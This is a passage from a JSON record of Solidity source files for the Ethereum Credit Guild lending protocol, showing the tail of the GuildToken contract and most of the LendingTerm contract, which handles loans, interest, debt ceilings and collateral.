\"GuildToken: transfers disabled\"\n        );\n    }\n\n    /// @notice emitted when reference to ProfitManager is updated\n    event ProfitManagerUpdated(uint256 timestamp, address newValue);\n\n    /// @notice set reference to ProfitManager\n    function setProfitManager(address _newProfitManager) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        profitManager = _newProfitManager;\n        emit ProfitManagerUpdated(block.timestamp, _newProfitManager);\n    }\n\n    /// @dev prevent outbound token transfers (_decrementWeightUntilFree) and gauge weight decrease\n    /// (decrementGauge, decrementGauges) for users who have an unrealized loss in a gauge, or if the\n    /// gauge is currently using its allocated debt ceiling. To decrement gauge weight, guild holders\n    /// might have to call loans if the debt ceiling is used.\n    /// Also update the user profit index and claim rewards.\n    function _decrementGaugeWeight(\n        address user,\n        address gauge,\n        uint256 weight\n    ) internal override {\n        uint256 _lastGaugeLoss = lastGaugeLoss[gauge];\n        uint256 _lastGaugeLossApplied = lastGaugeLossApplied[gauge][user];\n        require(\n            _lastGaugeLossApplied >= _lastGaugeLoss,\n            \"GuildToken: pending loss\"\n        );\n\n        // update the user profit index and claim rewards\n        ProfitManager(profitManager).claimGaugeRewards(user, gauge);\n\n        // check if gauge is currently using its allocated debt ceiling.\n        // To decrement gauge weight, guild holders might have to call loans if the debt ceiling is used.\n        uint256 issuance = LendingTerm(gauge).issuance();\n        if (issuance != 0) {\n            uint256 debtCeilingAfterDecrement = LendingTerm(gauge).debtCeiling(-int256(weight));\n            require(\n                issuance <= debtCeilingAfterDecrement,\n                \"GuildToken: debt ceiling used\"\n            );\n        }\n\n        super._decrementGaugeWeight(user, gauge, weight);\n    }\n\n    /// @dev prevent weight increment for gauge if user has an unapplied loss.\n    /// If the user has 0 weight (i.e. no loss to realize), allow incrementing\n    /// gauge weight & update lastGaugeLossApplied to current time.\n    /// Also update the user profit index an claim rewards.\n    /// @dev note that users voting for a gauge that is not a proper lending term could result in this\n    /// share of the user's tokens to be frozen, due to being unable to decrement weight.\n    function _incrementGaugeWeight(\n        address user,\n        address gauge,\n        uint256 weight\n    ) internal override {\n        uint256 _lastGaugeLoss = lastGaugeLoss[gauge];\n        uint256 _lastGaugeLossApplied = lastGaugeLossApplied[gauge][user];\n        if (getUserGaugeWeight[user][gauge] == 0) {\n            lastGaugeLossApplied[gauge][user] = block.timestamp;\n        } else {\n            require(\n                _lastGaugeLossApplied >= _lastGaugeLoss,\n                \"GuildToken: pending loss\"\n            );\n        }\n\n        ProfitManager(profitManager).claimGaugeRewards(user, gauge);\n\n        super._incrementGaugeWeight(user, gauge, weight);\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                        MINT / BURN\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice mint new tokens to the target address\n    function mint(\n        address to,\n        uint256 amount\n    ) external onlyCoreRole(CoreRoles.GUILD_MINTER) {\n        _mint(to, amount);\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                        Inheritance reconciliation\n    //////////////////////////////////////////////////////////////*/\n\n    function _burn(\n        address from,\n        uint256 amount\n    ) internal virtual override(ERC20, ERC20Gauges, ERC20MultiVotes) {\n        _decrementWeightUntilFree(from, amount);\n        _decrementVotesUntilFree(from, amount);\n        ERC20._burn(from, amount);\n    }\n\n    function transfer(\n        address to,\n        uint256 amount\n    )\n        public\n        virtual\n        override(ERC20, ERC20Gauges, ERC20MultiVotes)\n        returns (bool)\n    {\n        _decrementWeightUntilFree(msg.sender, amount);\n        _decrementVotesUntilFree(msg.sender, amount);\n        return ERC20.transfer(to, amount);\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    )\n        public\n        virtual\n        override(ERC20, ERC20Gauges, ERC20MultiVotes)\n        returns (bool)\n    {\n        _decrementWeightUntilFree(from, amount);\n        _decrementVotesUntilFree(from, amount);\n        return ERC20.transferFrom(from, to, amount);\n    }\n}"
    },
    {
      "filename": "src/loan/LendingTerm.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {SafeERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport {IERC20Permit} from \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol\";\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {CreditToken} from \"@src/tokens/CreditToken.sol\";\nimport {AuctionHouse} from \"@src/loan/AuctionHouse.sol\";\nimport {ProfitManager} from \"@src/governance/ProfitManager.sol\";\nimport {RateLimitedMinter} from \"@src/rate-limits/RateLimitedMinter.sol\";\n\n/// @notice Lending Term contract of the Ethereum Credit Guild, a base implementation of\n/// smart contract issuing CREDIT debt and escrowing collateral assets.\n/// Note that interest rate is non-compounding and the percentage is expressed per\n/// period of `YEAR` seconds.\ncontract LendingTerm is CoreRef {\n    using SafeERC20 for IERC20;\n\n    // events for the lifecycle of loans that happen in the lending term\n    /// @notice emitted when new loans are opened (mint debt to borrower, pull collateral from borrower).\n    event LoanOpen(\n        uint256 indexed when,\n        bytes32 indexed loanId,\n        address indexed borrower,\n        uint256 collateralAmount,\n        uint256 borrowAmount\n    );\n    /// @notice emitted when a loan is called.\n    event LoanCall(uint256 indexed when, bytes32 indexed loanId);\n    /// @notice emitted when a loan is closed (repay, onBid after a call, forgive).\n    enum LoanCloseType {\n        Repay,\n        Call,\n        Forgive\n    }\n    event LoanClose(\n        uint256 indexed when,\n        bytes32 indexed loanId,\n        LoanCloseType indexed closeType,\n        uint256 debtRepaid\n    );\n    /// @notice emitted when someone adds collateral to a loan\n    event LoanAddCollateral(\n        uint256 indexed when,\n        bytes32 indexed loanId,\n        address indexed borrower,\n        uint256 collateralAmount\n    );\n    /// @notice emitted when someone partially repays a loan\n    event LoanPartialRepay(\n        uint256 indexed when,\n        bytes32 indexed loanId,\n        address indexed repayer,\n        uint256 repayAmount\n    );\n\n    struct Signature {\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n    }\n\n    /// @notice reference number of seconds in 1 year\n    uint256 public constant YEAR = 31557600;\n\n    /// @notice timestamp of last partial repayment for a given loanId.\n    /// during borrow(), this is initialized to the borrow timestamp, if\n    /// maxDelayBetweenPartialRepay is != 0\n    mapping(bytes32 => uint256) public lastPartialRepay;\n\n    struct Loan {\n        address borrower; // address of a loan's borrower\n        uint256 borrowTime; // the time the loan was initiated\n        uint256 borrowAmount; // initial CREDIT debt of a loan\n        uint256 borrowCreditMultiplier; // creditMultiplier when loan was opened\n        uint256 collateralAmount; // balance of collateral token provided by the borrower\n        address caller; // a caller of 0 indicates that the loan has not been called\n        uint256 callTime; // a call time of 0 indicates that the loan has not been called\n        uint256 callDebt; // the CREDIT debt when the loan was called\n        uint256 closeTime; // the time the loan was closed (repaid or call+bid or forgive)\n    }\n\n    /// @notice the list of all loans that existed or are still active.\n    /// @dev see public getLoan(loanId) getter.\n    mapping(bytes32 => Loan) internal loans;\n\n    /// @notice current number of CREDIT issued in active loans on this term\n    /// @dev this can be lower than the sum of all loan's CREDIT debts because\n    /// interests accrue and some loans might have been opened before the creditMultiplier\n    /// was last updated, resulting in higher CREDIT debt than what was originally borrowed.\n    uint256 public issuance;\n\n    struct LendingTermReferences {\n        /// @notice reference to the ProfitManager\n        address profitManager;\n        /// @notice reference to the GUILD token\n        address guildToken;\n        /// @notice reference to the auction house contract used to\n        /// sell loan collateral for CREDIT if loans are called.\n        address auctionHouse;\n        /// @notice reference to the credit minter contract\n        address creditMinter;\n        /// @notice reference to the CREDIT token\n        address creditToken;\n    }\n\n    /// @notice References to other protocol contracts (see struct for more details)\n    LendingTermReferences internal refs;\n\n    struct LendingTermParams {\n        /// @notice reference to the collateral token\n        address collateralToken;\n        /// @notice max number of debt tokens issued per collateral token.\n        /// @dev be mindful of the decimals here, because if collateral\n        /// token doesn't have 18 decimals, this variable is used to scale\n        /// the decimals.\n        /// For example, for USDC collateral, this variable should be around\n        /// ~1e30, to allow 1e6 * 1e30 / 1e18 ~= 1e18 CREDIT to be borrowed for\n        /// each 1e6 units (1 USDC) of collateral, if CREDIT is targeted to be\n        /// worth around 1 USDC.\n        uint256 maxDebtPerCollateralToken;\n        /// @notice interest rate paid by the borrower, expressed as an APR\n        /// with 18 decimals (0.01e18 = 1% APR). The base for 1 year is the YEAR constant.\n        uint256 interestRate;\n        /// @notice maximum delay, in seconds, between partial debt repayments.\n        /// if set to 0, no periodic partial repayments are expected.\n        /// if a partial repayment is missed (delay has passed), the loan\n        /// can be called.\n        uint256 maxDelayBetweenPartialRepay;\n        /// @notice minimum percent of the total debt (principal + interests) to\n        /// repay during partial debt repayments.\n        /// percentage is expressed with 18 decimals, e.g. 0.05e18 = 5% debt.\n        uint256 minPartialRepayPercent;\n        /// @notice the opening fee is a percent of interest that instantly accrues\n        /// when the loan is opened.\n        /// The opening fee is expressed as a percentage of the borrowAmount, with 18\n        /// decimals, e.g. 0.05e18 = 5% of the borrowed amount.\n        /// A loan with 2% openingFee and 3% interestRate will owe 102% of the borrowed\n        /// amount just after being open, and after 1 year will owe 105%.\n        uint256 openingFee;\n        /// @notice the absolute maximum amount of debt this lending term can issue\n        /// at any given time, regardless of the gauge allocations.\n        uint256 hardCap;\n    }\n\n    /// @notice Params of the LendingTerm (see struct for more details)\n    LendingTermParams internal params;\n\n    constructor() CoreRef(address(1)) {\n        // core is set to address(1) to prevent implementation from being initialized,\n        // only proxies on the implementation can be initialized.\n    }\n\n    /// @notice initialize storage with references to other protocol contracts\n    /// and the lending term parameters for this instance.\n    function initialize(\n        address _core,\n        LendingTermReferences calldata _refs,\n        LendingTermParams calldata _params\n    ) external {\n        // can initialize only once\n        assert(address(core()) == address(0));\n        assert(_core != address(0));\n\n        // initialize storage\n        _setCore(_core);\n        refs = _refs;\n        params = _params;\n    }\n\n    /// @notice get references of this term to other protocol contracts\n    function getReferences()\n        external\n        view\n        returns (LendingTermReferences memory)\n    {\n        return refs;\n    }\n\n    /// @notice get parameters of this term\n    function getParameters() external view returns (LendingTermParams memory) {\n        return params;\n    }\n\n    /// @notice get parameter 'collateralToken' of this term\n    function collateralToken() external view returns (address) {\n        return params.collateralToken;\n    }\n\n    /// @notice get a loan\n    function getLoan(bytes32 loanId) external view returns (Loan memory) {\n        return loans[loanId];\n    }\n\n    /// @notice outstanding borrowed amount of a loan, including interests\n    function getLoanDebt(bytes32 loanId) public view returns (uint256) {\n        Loan storage loan = loans[loanId];\n        uint256 borrowTime = loan.borrowTime;\n\n        if (borrowTime == 0) {\n            return 0;\n        }\n\n        if (loan.closeTime != 0) {\n            return 0;\n        }\n\n        if (loan.callTime != 0) {\n            return loan.callDebt;\n        }\n\n        // compute interest owed\n        uint256 borrowAmount = loan.borrowAmount;\n        uint256 interest = (borrowAmount *\n            params.interestRate *\n            (block.timestamp - borrowTime)) /\n            YEAR /\n            1e18;\n        uint256 loanDebt = borrowAmount + interest;\n        uint256 _openingFee = params.openingFee;\n        if (_openingFee != 0) {\n            loanDebt += (borrowAmount * _openingFee) / 1e18;\n        }\n        uint256 creditMultiplier = ProfitManager(refs.profitManager)\n            .creditMultiplier();\n        loanDebt = (loanDebt * loan.borrowCreditMultiplier) / creditMultiplier;\n\n        return loanDebt;\n    }\n\n    /// @notice returns true if the term has a maximum delay between partial repays\n    /// and the loan has passed the delay for partial repayments.\n    function partialRepayDelayPassed(\n        bytes32 loanId\n    ) public view returns (bool) {\n        // if no periodic partial repays are expected, always return false\n        if (params.maxDelayBetweenPartialRepay == 0) return false;\n\n        // if loan doesn't exist, return false\n        if (loans[loanId].borrowTime == 0) return false;\n\n        // if loan is closed, return false\n        if (loans[loanId].closeTime != 0) return false;\n\n        // return true if delay is passed\n        return\n            lastPartialRepay[loanId] <\n            block.timestamp - params.maxDelayBetweenPartialRepay;\n    }\n\n    /// @notice returns the maximum amount of debt that can be issued by this term\n    /// according to the current gauge allocations.\n    /// Note that the debt ceiling can be lower than the current issuance under 4 conditions :\n    /// - params.hardCap is lower than since last borrow happened\n    /// - gauge votes are fewer than when last borrow happened\n    /// - profitManager.totalBorrowedCredit() decreased since last borrow\n    /// - creditMinter.buffer() is close to being depleted\n    /// @dev this solves the following equation :\n    /// borrowAmount + issuance <=\n    /// (totalBorrowedCredit + borrowAmount) * gaugeWeight * gaugeWeightTolerance / totalWeight / 1e18\n    /// which is the formula to check debt ceiling in the borrow function.\n    /// This gives the maximum borrowable amount to achieve 100% utilization of the debt\n    /// ceiling, and if we add the current issuance to it, we get the current debt ceiling.\n    /// @param gaugeWeightDelta an hypothetical change in gauge weight\n    /// @return the maximum amount of debt that can be issued by this term\n    function debtCeiling(\n        int256 gaugeWeightDelta\n    ) public view returns (uint256) {\n        address _guildToken = refs.guildToken; // cached SLOAD\n        uint256 gaugeWeight = GuildToken(_guildToken).getGaugeWeight(\n            address(this)\n        );\n        gaugeWeight = uint256(int256(gaugeWeight) + gaugeWeightDelta);\n        uint256 gaugeType = GuildToken(_guildToken).gaugeType(address(this));\n        uint256 totalWeight = GuildToken(_guildToken).totalTypeWeight(\n            gaugeType\n        );\n        uint256 creditMinterBuffer = RateLimitedMinter(refs.creditMinter)\n            .buffer();\n        uint256 _hardCap = params.hardCap; // cached SLOAD\n        if (gaugeWeight == 0) {\n            return 0; // no gauge vote, 0 debt ceiling\n        } else if (gaugeWeight == totalWeight) {\n            // one gauge, unlimited debt ceiling\n            // returns min(hardCap, creditMinterBuffer)\n            return\n                _hardCap < creditMinterBuffer ? _hardCap : creditMinterBuffer;\n        }\n        uint256 _issuance = issuance; // cached SLOAD\n        uint256 totalBorrowedCredit = ProfitManager(refs.profitManager)\n            .totalBorrowedCredit();\n        uint256 gaugeWeightTolerance = ProfitManager(refs.profitManager)\n            .gaugeWeightTolerance();\n        if (totalBorrowedCredit == 0 && gaugeWeight != 0) {\n            // first-ever CREDIT mint on a non-zero gauge weight term\n            // does not check the relative debt ceilings\n            // returns min(hardCap, creditMinterBuffer)\n            return\n                _hardCap < creditMinterBuffer ? _hardCap : creditMinterBuffer;\n        }\n        uint256 toleratedGaugeWeight = (gaugeWeight * gaugeWeightTolerance) /\n            1e18;\n        uint256 debtCeilingBefore = (totalBorrowedCredit *\n            toleratedGaugeWeight) / totalWeight;\n        if (_issuance >= debtCeilingBefore) {\n            return debtCeilingBefore; // no more borrows allowed\n        }\n        uint256 remainingDebtCeiling = debtCeilingBefore - _issuance; // always >0\n        if (toleratedGaugeWeight >= totalWeight) {\n            // if the gauge weight is above 100% when we include tolerance,\n            // the gauge relative debt ceilings are not constraining.\n            return\n                _hardCap < creditMinterBuffer ? _hardCap : creditMinterBuffer;\n        }\n        uint256 otherGaugesWeight = totalWeight - toleratedGaugeWeight; // always >0\n        uint256 maxBorrow = (remainingDebtCeiling * totalWeight) /\n            otherGaugesWeight;\n        uint256 _debtCeiling = _issuance + maxBorrow;\n        // return min(creditMinterBuffer, hardCap, debtCeiling)\n        if (creditMinterBuffer < _debtCeiling) {\n            return creditMinterBuffer;\n        }\n        if (_hardCap < _debtCeiling) {\n            return _hardCap;\n        }\n        return _debtCeiling;\n    }\n\n    /// @notice returns the debt ceiling without change to gauge weight\n    function debtCeiling() external view returns (uint256) {\n        return debtCeiling(0);\n    }\n\n    /// @notice initiate a new loan\n    function _borrow(\n        address borrower,\n        uint256 borrowAmount,\n        uint256 collateralAmount\n    ) internal returns (bytes32 loanId) {\n        require(borrowAmount != 0, \"LendingTerm: cannot borrow 0\");\n        require(collateralAmount != 0, \"LendingTerm: cannot stake 0\");\n\n        loanId = keccak256(\n            abi.encode(borrower, address(this), block.timestamp)\n        );\n\n        // check that the loan doesn't already exist\n        require(loans[loanId].borrowTime == 0, \"LendingTerm: loan exists\");\n\n        // check that enough collateral is provided\n        uint256 creditMultiplier = ProfitManager(refs.profitManager)\n            .creditMultiplier();\n        uint256 maxBorrow = (collateralAmount *\n            params.maxDebtPerCollateralToken) / creditMultiplier;\n        require(\n            borrowAmount <= maxBorrow,\n            \"LendingTerm: not enough collateral\"\n        );\n\n        // check that enough CREDIT is borrowed\n        require(\n            borrowAmount >= ProfitManager(refs.profitManager).minBorrow(),\n            \"LendingTerm: borrow amount too low\"\n        );\n\n        // check the hardcap\n        uint256 _issuance = issuance;\n        uint256 _postBorrowIssuance = _issuance + borrowAmount;\n        require(\n            _postBorrowIssuance <= params.hardCap,\n            \"LendingTerm: hardcap reached\"\n        );\n\n        // check the debt ceiling\n        uint256 totalBorrowedCredit = ProfitManager(refs.profitManager)\n            .totalBorrowedCredit();\n        uint256 gaugeWeightTolerance = ProfitManager(refs.profitManager)\n            .gaugeWeightTolerance();\n        uint256 _debtCeiling = (GuildToken(refs.guildToken)\n            .calculateGaugeAllocation(\n                address(this),\n                totalBorrowedCredit + borrowAmount\n            ) * gaugeWeightTolerance) / 1e18;\n        if (totalBorrowedCredit == 0) {\n            // if the lending term is deprecated, `calculateGaugeAllocation` will return 0, and the borrow\n            // should revert because the debt ceiling is reached (no borrows should be allowed anymore).\n            // first borrow in the system does not check proportions of issuance, just that the term is not deprecated.\n            require(_debtCeiling != 0, \"LendingTerm: debt ceiling reached\");\n        } else {\n            require(\n                _postBorrowIssuance <= _debtCeiling,\n                \"LendingTerm: debt ceiling reached\"\n            );\n        }\n\n        // save loan in state\n        loans[loanId] = Loan({\n            borrower: borrower,\n            borrowTime: block.timestamp,\n            borrowAmount: borrowAmount,\n            borrowCreditMultiplier: creditMultiplier,\n            collateralAmount: collateralAmount,\n            caller: address(0),\n            callTime: 0,\n            callDebt: 0,\n            closeTime: 0\n        });\n        issuance = _postBorrowIssuance;\n        if (params.maxDelayBetweenPartialRepay != 0) {\n            lastPartialRepay[loanId] = block.timestamp;\n        }\n\n        // mint debt to the borrower\n        RateLimitedMinter(refs.creditMinter).mint(borrower, borrowAmount);\n\n        // pull the collateral from the borrower\n        IERC20(params.collateralToken).safeTransferFrom(\n            borrower,\n            address(this),\n            collateralAmount\n        );\n\n        // emit event\n        emit LoanOpen(\n            block.timestamp,\n            loanId,\n            borrower,\n            collateralAmount,\n            borrowAmount\n        );\n    }\n\n    /// @notice initiate a new loan\n    function borrow(\n        uint256 borrowAmount,\n        uint256 collateralAmount\n    ) external whenNotPaused returns (bytes32 loanId) {\n        loanId = _borrow(msg.sender, borrowAmount, collateralAmount);\n    }\n\n    /// @notice add collateral on an open loan.\n    /// a borrower might want to add collateral so that his position does not go underwater due to\n    /// interests growing up over time.\n    function _addCollateral(\n        address borrower,\n        bytes32 loanId,\n        uint256 collateralToAdd\n    ) internal {\n        require(collateralToAdd != 0, \"LendingTerm: cannot add 0\");\n\n        Loan storage loan = loans[loanId];\n\n        // check the loan is open\n        require(loan.borrowTime != 0, \"LendingTerm: loan not found\");\n        require(loan.closeTime == 0, \"LendingTerm: loan closed\");\n        require(loan.callTime == 0, \"LendingTerm: loan called\");\n\n        // update loan in state\n        loans[loanId].collateralAmount += collateralToAdd;\n\n        // pull the collateral from the borrower\n        IERC20(params.collateralToken).safeTransferFrom(\n            borrower,\n            address(this),\n            collateralToAdd\n        );\n\n        // emit event\n        emit LoanAddCollateral(\n            block.timestamp,\n            loanId,\n            borrower,\n            collateralToAdd\n        );\n    }\n\n    /// @notice add collateral on an open loan.\n    function addCollateral(bytes32 loanId, uint256 collateralToAdd) external {\n        _addCollateral(msg.sender, loanId, collateralToAdd);\n    }\n\n    /// @notice partially repay an open loan.\n    /// a borrower might want to partially repay debt so that his position does not go underwater\n    /// due to interests building up.\n    /// some lending terms might also impose periodic partial repayments.\n    function _partialRepay(\n        address repayer,\n        bytes32 loanId,\n        uint256 debtToRepay\n    ) internal {\n        Loan storage loan = loans[loanId];\n\n        // check the loan is open\n        uint256 borrowTime = loan.borrowTime;\n        require(borrowTime != 0, \"LendingTerm: loan not found\");\n        require(\n            borrowTime < block.timestamp,\n            \"LendingTerm: loan opened in same block\"\n        );\n        require(loan.closeTime == 0, \"LendingTerm: loan closed\");\n        require(loan.callTime == 0, \"LendingTerm: loan called\");\n\n        // compute partial repayment\n        uint256 loanDebt = getLoanDebt(loanId);\n        require(debtToRepay < loanDebt, \"LendingTerm: full repayment\");\n        uint256 percentRepaid = (debtToRepay * 1e18) / loanDebt; // [0, 1e18[\n        uint256 borrowAmount = loan.borrowAmount;\n        uint256 creditMultiplier = ProfitManager(refs.profitManager)\n            .creditMultiplier();\n        uint256 principal = (borrowAmount * loan.borrowCredi"
    }
  ]
}